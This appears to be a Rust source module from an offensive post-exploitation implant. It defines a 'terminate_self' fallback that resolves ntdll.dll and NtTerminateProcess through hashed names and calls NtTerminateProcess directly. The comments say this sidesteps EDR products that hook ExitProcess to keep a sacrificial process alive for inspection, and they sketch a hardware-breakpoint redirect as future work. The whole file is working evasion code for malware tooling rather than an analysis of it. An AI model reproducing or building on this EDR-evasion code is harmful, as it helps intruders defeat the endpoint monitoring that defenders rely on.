//! Defence-in-depth process termination fallback.
//!
//! `postex::postex_exit` already calls ExitProcess/ExitThread which are
//! `-> !` in windows-sys, so this code is currently unreachable. It is
//! kept available for cases where ExitProcess is hooked/redirected by
//! an EDR (some products neuter ExitProcess to keep the inspected
//! sacrificial alive for further inspection); a direct
//! `NtTerminateProcess` indirect call sidesteps that.
//!
//! Future: wire this in by setting an HWBP on ExitProcess that redirects
//! to `terminate_self` on failure.

use opsec_peb::{resolve_export, resolve_module};
use opsec_strcrypt::hash;

#[allow(dead_code)]
pub unsafe fn terminate_self() -> ! {
    unsafe {
        type NtTerminateProcessFn =
            unsafe extern "system" fn(process_handle: *mut core::ffi::c_void, exit_status: i32) -> i32;

        if let Some(ntdll) = resolve_module(hash!("ntdll.dll")) {
            if let Some(p) = resolve_export(ntdll, hash!("NtTerminateProcess")) {
                let f: NtTerminateProcessFn = core::mem::transmute(p);
                // -1 == GetCurrentProcess pseudo handle.
                f(-1isize as *mut core::ffi::c_void, 0);
            }
        }
        loop {
            // Should never reach. Final fallback: spin so we don't return
            // garbage into the CS thread proc.
            core::hint::spin_loop();
        }
    }
}
